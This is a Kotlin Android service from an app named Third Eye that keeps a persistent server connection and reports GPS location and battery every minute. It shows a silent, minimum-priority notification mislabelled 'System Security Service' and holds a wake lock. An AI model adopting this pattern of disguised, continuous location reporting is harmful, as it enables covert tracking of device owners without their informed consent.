package com.thirdeye.app.service

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.thirdeye.app.MainActivity
import com.thirdeye.app.R
import com.thirdeye.app.uploader.BackendClient
import com.thirdeye.app.uploader.SocketManager

/**
 * 24/7 Persistent Background Service that keeps the device connected to the central
 * Third Eye server even when the app is minimized or the screen is turned off.
 *
 * Uses:
 * - FOREGROUND_SERVICE_DATA_SYNC to prevent Android 14 Doze Mode from killing the connection.
 * - Silent, minimal notification so it doesn't disturb the user.
 * - ConnectivityManager.NetworkCallback to automatically reconnect whenever Wi-Fi / Data changes.
 * - Partial WakeLock during heartbeats to ensure socket frames go through on deep sleep.
 */
class DeviceTelemetryService : Service() {

    companion object {
        private const val TAG = "TelemetryService"
        const val CHANNEL_ID = "thirdeye_telemetry_channel"
        const val NOTIFICATION_ID = 1003

        const val ACTION_START = "com.thirdeye.app.ACTION_START_TELEMETRY"
        const val ACTION_STOP = "com.thirdeye.app.ACTION_STOP_TELEMETRY"

        fun startService(context: Context) {
            val intent = Intent(context, DeviceTelemetryService::class.java).apply {
                action = ACTION_START
            }
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ContextCompat.startForegroundService(context, intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start DeviceTelemetryService", e)
            }
        }

        fun stopService(context: Context) {
            val intent = Intent(context, DeviceTelemetryService::class.java).apply {
                action = ACTION_STOP
            }
            context.startService(intent)
        }
    }

    private var wakeLock: PowerManager.WakeLock? = null
    private var connectivityManager: ConnectivityManager? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var heartbeatThread: Thread? = null
    private var isRunning = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "DeviceTelemetryService created")
        createSilentNotificationChannel()
        acquireWakeLock()
        registerNetworkCallback()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                Log.i(TAG, "Stopping DeviceTelemetryService")
                stopSelf()
                return START_NOT_STICKY
            }
            else -> {
                startForegroundNotification()
                startTelemetryEngine()
            }
        }
        return START_STICKY
    }

    private fun startTelemetryEngine() {
        if (isRunning) return
        isRunning = true

        // 1. Initialize persistent Socket.io connection
        SocketManager.initAndConnect(applicationContext)

        // 2. Send initial HTTP ping with GPS coordinates & battery
        BackendClient.sendPing(applicationContext)

        // 3. Start background periodic heartbeat thread
        heartbeatThread?.interrupt()
        heartbeatThread = Thread {
            try {
                var cycleCount = 0
                while (isRunning && !Thread.currentThread().isInterrupted) {
                    Thread.sleep(20000) // Every 20 seconds

                    cycleCount++

                    // Ensure socket is alive
                    if (!SocketManager.isConnected()) {
                        Log.d(TAG, "Socket disconnected, reconnecting...")
                        SocketManager.initAndConnect(applicationContext)
                    }

                    // Every 60 seconds (every 3rd cycle), send full HTTP ping to keep MongoDB lastSeen fresh
                    if (cycleCount % 3 == 0) {
                        BackendClient.sendPing(applicationContext)
                    }
                }
            } catch (e: InterruptedException) {
                // Thread stopped
            }
        }.apply {
            isDaemon = true
            name = "TelemetryHeartbeatThread"
            start()
        }

        Log.i(TAG, "Telemetry engine running 24/7")
    }

    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "thirdeye:telemetry_wakelock").apply {
                setReferenceCounted(false)
                acquire(10 * 60 * 1000L) // 10 min safe timeout, renewed periodically
            }
        } catch (e: Exception) {
            Log.w(TAG, "Could not acquire partial WakeLock: ${e.message}")
        }
    }

    private fun registerNetworkCallback() {
        try {
            connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()

            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    Log.i(TAG, "Network became available, reconnecting telemetry...")
                    SocketManager.reconnect(applicationContext)
                    BackendClient.sendPing(applicationContext)
                }

                override fun onLost(network: Network) {
                    Log.w(TAG, "Network lost")
                }
            }
            connectivityManager?.registerNetworkCallback(request, networkCallback!!)
        } catch (e: Exception) {
            Log.w(TAG, "Failed to register NetworkCallback: ${e.message}")
        }
    }

    private fun createSilentNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Background Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Keeps device telemetry synchronized"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun startForegroundNotification() {
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Security Service")
            .setContentText("Telemetry active in background")
            .setSmallIcon(R.drawable.ic_camera_record)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        heartbeatThread?.interrupt()
        heartbeatThread = null

        try {
            networkCallback?.let { connectivityManager?.unregisterNetworkCallback(it) }
        } catch (e: Exception) {
            // Ignore
        }

        try {
            wakeLock?.let { if (it.isHeld) it.release() }
        } catch (e: Exception) {
            // Ignore
        }

        Log.i(TAG, "DeviceTelemetryService destroyed")
    }
}
